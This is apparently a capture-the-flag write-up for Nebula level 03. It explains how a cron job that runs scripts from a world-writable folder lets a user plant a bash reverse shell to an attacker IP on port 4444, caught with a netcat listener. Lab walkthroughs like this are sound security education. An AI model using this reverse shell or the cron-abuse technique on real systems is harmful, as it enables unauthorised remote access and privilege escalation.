---
author: Josh Genao
Date: 2023-01-02
Category:
Tags: #reverseshell
---

# Level-03
## Description
Check the home directory of **flag03** and take note of the files there.
There is a crontab that is called every couple of minutes.
## Setup
-   SSH into the Nebula VM using the following credentials:

```
username: level03
password: level03
```
## Summary
If we look in the `/home/flag03` folder we will notice that there is a folder named `writable.d` and a file called `writable.sh`

![](../imgs/Pasted%20image%2020230102172326.png)

Inside the `writable.sh`, we can see that the script is running every script located in the `/home/flag03/writeable.d` folder. Since the `writable.d` folder permissions are set so anyone can alter the file content, we will take advantage of that

```
level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

As we can see, the `writeable.d` folder contains `777` permissions in which we are able to put any files in there and the cron job should be able to execute our file.

We can place a reverse shell [^1] doing the following:
```
level03@nebula:/home/flag03$ echo "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1" >  /home/level03/shell
level03@nebula:/home/flag03$ cp /home/level03/shell /home/flag03/writable.d
```

In the command above, we are appending the following command into the shell file:
`bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"`

The bash script will open a TCP connection to the associated `ATTACKER IP` on port 4444 and all standard input, output, and error streams are sent via this connection. [^2]

On our machine, letss setup Netcat to listen for an incoming shell on port 4444 by running the following command
`$ nc -nlp 4444`

Once connection is established and the cron job executes, the target device will have `/bin/bash` input, output, and error data streams sent to our machine on port 4444 and we will be able to interact with the shell as `flag03` user
## Flag
![](../imgs/Pasted%20image%2020230102210123.png)
## References
[^1]: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#c
[^2]: https://tldp.org/LDP/abs/html/devref1.html#:~:text=When%20executing%20a%20command%20on,%2C%20for%20a%20connecting%20cable.)
